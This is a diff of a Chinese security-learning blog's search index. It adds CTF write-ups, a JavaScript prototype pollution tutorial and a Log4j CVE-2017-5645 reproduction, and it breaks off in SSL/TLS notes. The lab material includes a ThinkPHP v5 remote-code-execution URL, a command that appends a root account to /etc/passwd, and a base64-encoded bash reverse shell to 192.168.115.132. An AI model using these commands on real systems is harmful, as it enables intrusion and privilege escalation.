@@ -1,7 +1,7 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>web攻防</title>
+    <title>CTF</title>
     <url>/2022/08/15/web%E6%94%BB%E9%98%B2/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>实例</p>
 <span id="more"></span>
@@ -27,6 +27,70 @@
 <p>没有什么可操作的地方除了地址框，猜测是sql注入<br>方法1：直接采用万能钥匙<br><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815115337825.png" alt></p>
 <p>方法二：sqlmap一把梭<br>先查数据库名<img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815115419759.png" alt="image-20220815115419759"><br><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815115447014.png" alt><br>查表名<br><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815115506861.png" alt><br><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815115521175.png" alt><br>输出表中所有字段<br><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815115600014.png" alt><br><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815115612711.png" alt><br>输出pw字段内容<br><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815115639962.png" alt><br><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815115652969.png" alt><br>得到flag</p>
 <p>直接一把梭<br><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815115726708.png" alt><br><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815115746924.png" alt></p>
+<h2 id="第四题——cat-wife"><a href="#第四题——cat-wife" class="headerlink" title="第四题——cat_wife"></a>第四题——cat_wife</h2><p><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20230702180603744.png" alt="image-20230702180603744"></p>
+<p>给出一个登陆界面，看到有注册，有url框，很容易会想到注入和爆破，但是题目要求说了不需要爆破，抓个包看看</p>
+<p><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20230702180815052.png" alt="image-20230702180815052"></p>
+<p>很明显传递了两个参数username和password</p>
+<p>账户密码错误或为空会返回</p>
+<p><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20230702181651762.png" alt="image-20230702181651762"></p>
+<p>检查注册页面</p>
+<p>成功注册</p>
+<p><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20230702181924542.png" alt="image-20230702181924542"></p>
+<p><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20230702182016261.png" alt="image-20230702182016261"></p>
+<p>注意到还有一个is admin选项</p>
+<p><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20230702182128449.png" alt="image-20230702182128449"></p>
+<p>会多出一个invite code选项，并且会前端检查是否填写</p>
+<p><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20230702182106478.png" alt="image-20230702182106478"></p>
+<p><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20230702182211209.png" alt="image-20230702182211209"></p>
+<p>多两个参数，尝试更改参数，但是没有用。nmap进行端口扫描</p>
+<p><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20230702182532710.png" alt="image-20230702182532710"></p>
+<p>很多apache服务</p>
+<p><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20230702182553404.png" alt="image-20230702182553404"></p>
+<p><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20230702182706094.png" alt="image-20230702182706094"></p>
+<p><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20230702182746936.png" alt="image-20230702182746936"></p>
+<p>经典漏洞远程执行</p>
+<p><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20230702183653753.png" alt="image-20230702183653753"></p>
+<p>可能存在文件上传漏洞</p>
+<p>通过端口扫描得到两个可能存在漏洞的页面和一个php代码</p>
+<h2 id="thinkphp-v5"><a href="#thinkphp-v5" class="headerlink" title="thinkphp v5"></a>thinkphp v5</h2><figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line">构造url：ip/index.php?s=index/think\app/invokefunction&amp;<span class="function"><span class="keyword">function</span>=<span class="title">call_user_func_array</span>&amp;<span class="title">vars</span><span class="params">[0]</span>=<span class="title">system</span>&amp;<span class="title">vars</span><span class="params">[1]</span><span class="params">[]</span>=<span class="params">[linux指令]</span></span></span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20230702183957488.png" alt="image-20230702183957488"></p>
+<p>得到我们是www-data用户</p>
+<p>nc尝试正向连接与反向连接均失败</p>
+<p>可以创建root权限用户，查看passwd表中书写格式</p>
+<p><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20230702185059204.png" alt="image-20230702185059204"></p>
+<p>openssl生成用户并获得加密后的密码</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">openssl</span> passwd -<span class="number">1</span> -salt<span class="meta"> [username] [password]</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20230702185209920.png" alt="image-20230702185209920"></p>
+<p>按照root格式写入passwd文件</p>
+<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">echo</span> <span class="string">&#x27;root:<span class="variable">$1</span><span class="variable">$akali</span><span class="variable">$CfWdWxRQ88</span>/m65buOdMLV0 <span class="variable">$1</span><span class="variable">$akali</span><span class="variable">$CfWdWxRQ88</span>/m65buOdMLV0:0:0:root:/root:/bin/bash&#x27;</span> &gt;&gt; /etc/passwd</span><br></pre></td></tr></table></figure>
+<p>但是被拒绝</p>
+<p>查看系统版本</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/*-release</span><br><span class="line"><span class="built_in">uname</span> -a</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20230702190107598.png" alt="image-20230702190107598"></p>
+<p><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20230702190136068.png" alt="image-20230702190136068"></p>
+<p>找一下有没有合适的exploit</p>
+<p><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20230702191918573.png" alt="image-20230702191918573"></p>
+<p>但是发现无法写入文件也无法切换到tmp下</p>
+<p>尝试定时任务提权也发现并没有可写权限的文件</p>
+<p>目前通过www-data提权方式走不通</p>
+<p>ls看看当前能访问的文件</p>
+<p><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20230702192713361.png" alt="image-20230702192713361"></p>
+<p>router.php<br><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20230702192807453.png" alt="image-20230702192807453"></p>
+<p>index.php<br><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20230702192902763.png" alt="image-20230702192902763"></p>
+<p>robots.txt<br><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20230702192934875.png" alt="image-20230702192934875"></p>
+<p>当前路径<br><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20230702193207392.png" alt="image-20230702193207392"></p>
+<p>没有找到特别有用的信息，看一下文件上传页面，上传正常图片<br><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20230702193401485.png" alt="image-20230702193401485"></p>
+<p>上传php图片时，而且是前端验证<br><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20230702193515809.png" alt="image-20230702193515809"></p>
+<p>尝试图片马<br><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20230702193639916.png" alt="image-20230702193639916"></p>
+<p>存在端口的影响，绝对路径也很难用御剑爆破出来</p>
+<p>wp查看源码，得到是一个原型链污染</p>
+<p><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20230702200247737.png" alt="image-20230702200247737"></p>
+<p>就可以了</p>
+<p><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20230702200658611.png" alt="image-20230702200658611"></p>
+<p><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20230702200727563.png" alt="image-20230702200727563"></p>
+<h2 id="第五题——catcat"><a href="#第五题——catcat" class="headerlink" title="第五题——catcat"></a>第五题——catcat</h2><p><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20230702200959138.png" alt="image-20230702200959138"></p>
+<p><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20230702201012248.png" alt="image-20230702201012248"></p>
+<p>可能存在任意文件读取漏洞</p>
 ]]></content>
       <categories>
         <category>实例</category>
@@ -689,6 +753,396 @@ d = R(2\frac{\rho _M}{\rho_m})^\frac{1}{3}</script><p><img src="/2023/02/21/%E7%
       </tags>
   </entry>
   <entry>
+    <title>JS原型链污染</title>
+    <url>/2023/07/17/JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93-0/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>JS原型链的学习以及污染</p>
+<span id="more"></span>
+<h1 id="JS原型链污染"><a href="#JS原型链污染" class="headerlink" title="JS原型链污染"></a>JS原型链污染</h1><h2 id="JS创建对象"><a href="#JS创建对象" class="headerlink" title="JS创建对象"></a>JS创建对象</h2><h3 id="普通创建"><a href="#普通创建" class="headerlink" title="普通创建"></a>普通创建</h3><figure class="highlight actionscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> person1=&#123;name:<span class="string">&#x27;akali&#x27;</span>,<span class="string">&#x27;age&#x27;</span>:<span class="string">&#x27;23&#x27;</span>&#125;</span><br><span class="line"><span class="keyword">var</span> person1=&#123;&#125;  <span class="comment">//创建空对象</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2023/07/17/JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93-0/image-20230713101533476-16896051623861.png" alt="image-20230713101533476"></p>
+<h3 id="构造函数方法创建"><a href="#构造函数方法创建" class="headerlink" title="构造函数方法创建"></a>构造函数方法创建</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">person2</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span>=<span class="string">&quot;akali&quot;</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">test</span>=<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">23333</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">person2.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">a</span>=<span class="number">3</span>;</span><br><span class="line">web=<span class="keyword">new</span> <span class="title function_">person2</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(web.<span class="title function_">test</span>());</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(web.<span class="property">a</span>)</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/07/17/JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93-0/image-20230713101555789-16896052133033.png" alt="image-20230713101555789"></p>
+<h3 id="通过object创建"><a href="#通过object创建" class="headerlink" title="通过object创建"></a>通过object创建</h3><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a=<span class="keyword">new</span> Object();</span><br><span class="line">a.c=<span class="number">3</span></span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(a.c)</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/07/17/JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93-0/image-20230713101546246-16896052239424.png" alt="image-20230713101546246"></p>
+<h2 id="prototype和proto"><a href="#prototype和proto" class="headerlink" title="prototype和proto"></a>prototype和proto</h2><p><strong>对象.proto=构造器(构造函数).prototype</strong></p>
+<p><img src="/2023/07/17/JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93-0/image-20230713102158895-16896052380025.png" alt="image-20230713102158895"></p>
+<p><strong>构造器.prototype其实也是一个对象，为构造函数的原型对象</strong>，同样有<code>__proto__</code>属性，一直通过<a href="https://so.csdn.net/so/search?q=原型链&amp;spm=1001.2101.3001.7020">原型链</a><code>__proto__</code>最终可找到null。</p>
+<p><img src="/2023/07/17/JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93-0/image-20230713102620116-16896052458026.png" alt="image-20230713102620116"></p>
+<p><img src="/2023/07/17/JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93-0/image-20230713102631303-16896052560427.png" alt="image-20230713102631303"></p>
+<h3 id="完整流程"><a href="#完整流程" class="headerlink" title="完整流程"></a>完整流程</h3><p><img src="/2023/07/17/JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93-0/image-20230713103021670-16896052652728.png" alt="image-20230713103021670"></p>
+<p>prototype是一个类的属性，<strong>所有类对象在实例化的时候将会拥有prototype中的属性和方法</strong> <strong>一个对象(foo)的<code>__proto__</code>属性，指向这个对象所在的类(Foo)的prototype属性</strong></p>
+<p><img src="/2023/07/17/JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93-0/image-20230713103308380-16896052730669.png" alt="image-20230713103308380"></p>
+<p>js引擎操作：在对象son中寻找last_name， 如果找不到，<strong>则在son.<code>__proto__</code>中寻找last_name</strong> 如果仍然找不到，则继续在son.<strong><code>_proto_</code></strong>.<code>__proto__</code>中寻找last_name 依次寻找，直到找到null结束。</p>
+<p><img src="/2023/07/17/JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93-0/image-20230713103813565-168960528478610.png" alt="image-20230713103813565"></p>
+<p>JavaScript的这个查找的机制，被运用在面向对象的继承中，被称作prototype继承链。</p>
+<p>每个构造函数(constructor)都有一个原型对象(prototype) 对象的<strong>proto</strong>属性，指向类的原型对象prototype JavaScript使用prototype链实现继承机制</p>
+<h2 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h2><p><img src="/2023/07/17/JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93-0/image-20230713104250067-168960529457711.png" alt="image-20230713104250067"></p>
+<p>即修改object()中bar为2，没有bar这个键会创建bar后在赋值为2</p>
+<p><img src="/2023/07/17/JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93-0/image-20230713104344364-168960530278712.png" alt="image-20230713104344364"></p>
+<p>实例化一个新对象zoo</p>
+<p><img src="/2023/07/17/JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93-0/image-20230713104417493-168960531139613.png" alt="image-20230713104417493"></p>
+<p>zoo.__proto__就是object()，虽然zoo是一个空对象，但是会继承object中的键值。</p>
+<p>如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是原型链污染。</p>
+<h2 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h2><h3 id="merge"><a href="#merge" class="headerlink" title="merge"></a>merge</h3><figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">function <span class="keyword">merge</span>(target, source) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> <span class="keyword">key</span> <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">key</span> <span class="keyword">in</span> source &amp;&amp; <span class="keyword">key</span> <span class="keyword">in</span> target) &#123;</span><br><span class="line">            <span class="keyword">merge</span>(target[<span class="keyword">key</span>], source[<span class="keyword">key</span>])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[<span class="keyword">key</span>] = source[<span class="keyword">key</span>]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = JSON.<span class="keyword">parse</span>(<span class="string">&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;</span>)</span><br><span class="line"><span class="keyword">merge</span>(o1, o2)</span><br><span class="line">console.<span class="built_in">log</span>(o1.a, o1.b)//<span class="number">1</span>,<span class="number">2</span></span><br><span class="line"> </span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line">console.<span class="built_in">log</span>(o3.b)//<span class="number">2</span></span><br></pre></td></tr></table></figure>
+<p>这里使用了JSON.prase，其作用<br><img src="/2023/07/17/JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93-0/image-20230713105811480-168960532305614.png" alt="image-20230713105811480"></p>
+<p>可以看到o1中__proto__直接就被解析了，指向了原型对象{“b”:2}，就污染不到最上层的Object。</p>
+<p><img src="/2023/07/17/JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93-0/image-20230713110724715-168960534151215.png" alt="image-20230713110724715"><br><img src="/2023/07/17/JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93-0/image-20230713110735157-168960535102816.png" alt="image-20230713110735157"><br><img src="/2023/07/17/JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93-0/image-20230713110808938-168960536034417.png" alt="image-20230713110808938"></p>
+<p>所以直接o1.__proto__.b = 2 就可以完成污染或者使用JSON.prase<br><img src="/2023/07/17/JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93-0/image-20230713111047118-168960537549618.png" alt="image-20230713111047118"></p>
+<p>可以看到o2有两个键，原型对象是object，object已经被污染存在b:2<br>新定义一个对象o3</p>
+<p><img src="/2023/07/17/JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93-0/image-20230713111209846-168960538733919.png" alt="image-20230713111209846"></p>
+<p>可以看到污染成功</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>Log4j</title>
+    <url>/2023/07/17/Log4j/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>CVE-2017-5645</p>
+<span id="more"></span>
+<h1 id="log4j"><a href="#log4j" class="headerlink" title="log4j"></a>log4j</h1><h2 id="CVE-2017-5645"><a href="#CVE-2017-5645" class="headerlink" title="CVE-2017-5645"></a>CVE-2017-5645</h2><h3 id="Apache-Log4j"><a href="#Apache-Log4j" class="headerlink" title="Apache Log4j"></a>Apache Log4j</h3><p>Log4j是Apache的一个开源项目，通过使用Log4j，我们可以控制日志信息输送的目的地是控制台、文件、GUI组件，甚至是套接口服务器、NT的事件记录器、UNIX Syslog守护进程等；我们也可以控制每一条日志的输出格式；通过定义每一条日志信息的级别，我们能够更加细致地控制日志的生成过程。最令人感兴趣的就是，这些可以通过一个配置文件来灵活地进行配置，而不需要修改应用的代码。Log4j在工程中可以易用，方便等代替了 System.out 等打印语句，它是 Java 下最流行的日志输入工具，一些著名的开源项目，像spring、hibernate、struts都使用该 工具 作为日志输入工具，可以帮助调试（有时候debug是发挥不了作用的）和分析。</p>
+<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>攻击者可以通过发送一个特别制作的2进制payload，在组件将字节反序列化为对象时，触发并执行构造的payload代码。该漏洞主要是由于在处理ObjectInputStream时，接收函数对于不可靠来源的input没有过滤。可以通过给TcpSocketServer和UdpSocketServer添加可配置的过滤功能以及一些相关设置，可以有效的解决该漏洞。</p>
+<h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p> Apache Log4j 2.8.2之前的2.x版本</p>
+<h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><p>无</p>
+<h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><h4 id="1-端口扫描"><a href="#1-端口扫描" class="headerlink" title="1.端口扫描"></a>1.端口扫描</h4><p><img src="/2023/07/17/Log4j/image-20230717141145005-16896043538391.png" alt="image-20230717141145005"></p>
+<h4 id="2-漏洞尝试"><a href="#2-漏洞尝试" class="headerlink" title="2.漏洞尝试"></a>2.漏洞尝试</h4><p><img src="/2023/07/17/Log4j/image-20230717141318085-16896043740942.png" alt="image-20230717141318085"></p>
+<p><img src="/2023/07/17/Log4j/image-20230717141442238-16896043822623.png" alt="image-20230717141442238"></p>
+<p>可以看到命令成功执行</p>
+<h4 id="3-反弹shell"><a href="#3-反弹shell" class="headerlink" title="3.反弹shell"></a>3.反弹shell</h4><p><img src="/2023/07/17/Log4j/image-20230717143237332-16896044063984.png" alt="image-20230717143237332"></p>
+<p>使用base64加密<code>bash -i &gt;&amp; /dev/tcp/192.168.115.132/12345 0&gt;&amp;1</code>降低被识别的概率</p>
+<p><img src="/2023/07/17/Log4j/image-20230717143553187-16896044338725.png" alt="image-20230717143553187"></p>
+<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p><img src="/2023/07/17/Log4j/image-20230717144912598-16896044466736.png" alt="image-20230717144912598"></p>
+<p>TcpSocketServer类结构中有CommandLineArguments类用于自定义处理命令行参数，SocketHandler类用于处理客户端连接</p>
+<p><img src="/2023/07/17/Log4j/image-20230717145654303-16896044525257.png" alt="image-20230717145654303"></p>
+<p>TcpSocketServer.java中将clientSockt作为参数实例化SocketHandler类并防御handlers中</p>
+<p><img src="/2023/07/17/Log4j/image-20230717150108984-16896044589578.png" alt="image-20230717150108984"></p>
+<p>SocketHandler的构造函数中在获取socket中数据流后，传入logEvebtInput的wrapStream中</p>
+<p><img src="/2023/07/17/Log4j/image-20230717150431654-16896044678409.png" alt="image-20230717150431654"></p>
+<p>可以看到logEventInput是logEvntBridge类型，查看wrapStream函数后可以得知有AbstractLogEventBridge和ObjectInputStreamLogEventBridge实现，所以上上图中this.inputStream是一个ObjectInputSteamLogEventBridge对象</p>
+<p>SocketHandler类中还有一个函数run()</p>
+<p><img src="/2023/07/17/Log4j/image-20230717151306361-168960447525910.png" alt="image-20230717151306361"></p>
+<p>查看logEvents函数</p>
+<p><img src="/2023/07/17/Log4j/Users/akali/Documents/WeChat Files/wxid_4327bz6s9e0d22/FileStorage/File/2023-07/2(1" alt="image-20230717151340189">/2/go/image-20230717151340189.png)</p>
+<p>inputStream传入logEvents后，直接调用了readObject触发反序列化而没有对输入进行过滤。</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>SSL</title>
+    <url>/2023/07/11/SSL/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>HTTPS协议中SSL以及TLS协议的学习</p>
+<span id="more"></span>
+<h1 id="SSL"><a href="#SSL" class="headerlink" title="SSL"></a>SSL</h1><h2 id="SSL简介"><a href="#SSL简介" class="headerlink" title="SSL简介"></a>SSL简介</h2><h3 id="SSL和TLS"><a href="#SSL和TLS" class="headerlink" title="SSL和TLS"></a>SSL和TLS</h3><p>SSL:安全套接层，用于保障Word Wide Web（WWW）通信安全。主要任务是提供私密性，信息完整性和身份认证。</p>
+<p>TLS:用于在两个通信应用协议之间提供保密性和数据完整性。整体来说TLS非常类似于SSLv3</p>
+<h3 id="SSL协议"><a href="#SSL协议" class="headerlink" title="SSL协议"></a>SSL协议</h3><p>不依赖于平台和应用程序的协议，位于TCP/IP协议与各种应用层协议(HTTP、SMTP、FTP…)，为数据通信提高安全支持</p>
+<h2 id="SSL原理详解"><a href="#SSL原理详解" class="headerlink" title="SSL原理详解"></a>SSL原理详解</h2><h3 id="SSL协议结构"><a href="#SSL协议结构" class="headerlink" title="SSL协议结构"></a>SSL协议结构</h3><div class="table-container">
+<table>
+<thead>
+<tr>
+<th style="text-align:center">应用层协议</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">SSL握手协议\</td>
+<td>SSL密码变化协议\</td>
+<td>SSL警告协议</td>
+</tr>
+<tr>
+<td style="text-align:center">SSL记录协议</td>
+</tr>
+<tr>
+<td style="text-align:center">TCP</td>
+</tr>
+<tr>
+<td style="text-align:center">IP</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>SSL包含两个协议子层，其中底层是SSL记录协议层，高层是SSL握手协议层</p>
+<p>SSL记录协议层的作用是为高层协议提供基本的安全服务。使得超文本的传输协议HTTP能够在SSL运行。记录封装各种高层协议，具体实施压缩解压缩、加密解密、计算和校验MAC等与安全有关的操作。</p>
+<p>SSL握手协议层包括SSL握手协议（SSL HandShake Protocol）、SSL密码参数修改协议（SSL Change Cipher Spec Protocol）和SSL告警协议（SSL Alert Protocol）。握手层的这些协议用于SSL管理信息的交换，允许应用协议传送数据之间相互验证，协商加密算法和生成密钥等。</p>
+<p>SSL握手协议的作用是协调客户和服务器的状态，使双方能够达到状态的同步。</p>
+<ul>
+<li>SSL记录协议：它建立在可靠的传输（如TCP）之上，为高层协议提供数据封装、压缩、加密等基本功能。</li>
+<li>SSL握手协议：它建立在SSL记录协议之上，用于在实际的数据传输开始之前，通讯双方进行身份认证、协商加密算法、交换加密密钥等。</li>
+</ul>
+<h3 id="SSL建立"><a href="#SSL建立" class="headerlink" title="SSL建立"></a>SSL建立</h3><h4 id="第一阶段"><a href="#第一阶段" class="headerlink" title="第一阶段"></a>第一阶段</h4><p>1.ClientHello</p>
+<p><img src="/2023/07/11/SSL/image-20230711163615343.png" alt="image-20230711163615343"></p>
+<ul>
+<li>客户端版本</li>
+<li>客户端随机数</li>
+<li>会话ID：如果客户端第一次连接到服务器，那么该字段就会保持为空</li>
+<li>加密套件：Cipher Suites</li>
+<li>压缩办法</li>
+<li>扩展包：其他参数（如服务器名称，填充，支持的前面算法）</li>
+</ul>
+<p>2.ServerHello</p>
+<p>这个消息从Client Hello传过来的Cipher Suites里确定一份加密套件，另外还会生成一份随机数Random2。至此，客户端和服务端都拥有了两个随机数，会在后续生成对称密钥时用到。</p>
+<p><img src="/2023/07/11/SSL/image-20230711165243052.png" alt="image-20230711165243052"></p>
+<p>这个阶段之后，客户端服务端知道了下列内容</p>
+<ol>
+<li>SSL版本</li>
+<li>密钥交换、信息验证、加密算法</li>
+<li>压缩方法</li>
+<li>有关密钥生成的两个随机数</li>
+</ol>
+<h4 id="第二阶段"><a href="#第二阶段" class="headerlink" title="第二阶段"></a>第二阶段</h4><p>服务器启动SSL握手第二阶段，是本阶段所有消息的唯一发送方，客户机是所有消息的唯一接收方。共进行4步：</p>
+<ol>
+<li>证书：该证书包含公钥和数字签名。服务器将数字证书和到根CA整个链发给客户端，使客户端能用服务器证书中的服务器公钥认证服务器。<br><img src="/2023/07/11/SSL/image-20230711172203949.png" alt="image-20230711172203949"></li>
+<li>服务器密钥交换：可选<br><img src="/2023/07/11/SSL/image-20230711172244195.png" alt="image-20230711172244195"><br>如这里使用的是DH</li>
+<li>证书请求：服务端可能会要求客户自身进行验证这一步是可选的，如果在对安全性要求高的常见可能用到。服务器用来验证客户端。服务器端发出Certificate Request消息，要求客户端发他自己的证书过来进行验证。该消息中包含服务器端支持的证书类型（RSA、DSA、ECDSA等）和服务器端所信任的所有证书发行机构的CA列表，客户端会用这些信息来筛选证书。</li>
+<li>服务器握手完成</li>
+</ol>
+<h4 id="SSL-中服务端认证"><a href="#SSL-中服务端认证" class="headerlink" title="SSL 中服务端认证"></a>SSL 中服务端认证</h4><ol>
+<li>CA知道服务器公钥，对证书以及服务器公钥使用hash加密生成<strong>摘要信息</strong></li>
+<li>摘要信息经过CA密钥加密生成<strong>签名</strong>，并附在证书下方，发送给服务器</li>
+<li>服务器将附带签名的证书和自己的公钥一同发送至客户端</li>
+<li>客户端找到第三方机构CA，获取CA公钥，并使用CA公钥对签名解密获得摘要</li>
+<li>客户端将证书进行相同的hash处理，得到<strong>信息</strong></li>
+<li>将信息与摘要进行对比，一样则身份得到认证</li>
+</ol>
+<h3 id="第三阶段"><a href="#第三阶段" class="headerlink" title="第三阶段"></a>第三阶段</h3><p>客户端启动第三阶段，本阶段客户端是消息的唯一发送方，服务器是所有消息的唯一接收方。</p>
+<ol>
+<li>证书：可选。按照服务端发送的Certificate Request消息筛选证书。如果没有证书，则发送一个no_certificate警告</li>
+<li>客户机密钥交换：根据之前从服务器端收到的随机数(ServerHello中的随机数)，根据不同的密钥交换算法，算出一个pre-master发送给服务端。服务端收到pre-master计算出main master，客户端也可以计算出main master，这样双方就算出了对称密钥。<br>如果是RSA算法，会生成一个48字节的随机数，然后用server的公钥加密后放入报文中。<br>如果是DH算法，发送客户端的DH参数，之后服务器和客户端根据DH算法，各自计算出相同的pre-master secret</li>
+<li>证书验证：可选</li>
+</ol>
+<h3 id="第四阶段"><a href="#第四阶段" class="headerlink" title="第四阶段"></a>第四阶段</h3><ol>
